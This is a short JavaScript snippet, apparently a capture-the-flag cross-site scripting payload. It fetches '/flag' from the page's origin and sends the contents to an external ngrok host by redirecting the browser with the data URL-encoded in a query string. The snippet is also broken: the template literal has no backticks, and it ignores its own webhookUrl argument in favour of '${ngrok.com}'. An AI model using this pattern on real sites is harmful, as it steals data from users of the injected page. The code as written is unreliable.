    async function sendFlagTongrok(webhookUrl) {
  try {
    const response = await fetch('/flag');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = ${ngrok.com}?data=${encodedData};

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagTongrok('https://3afe-122-161-50-113.in.ngrok.io');
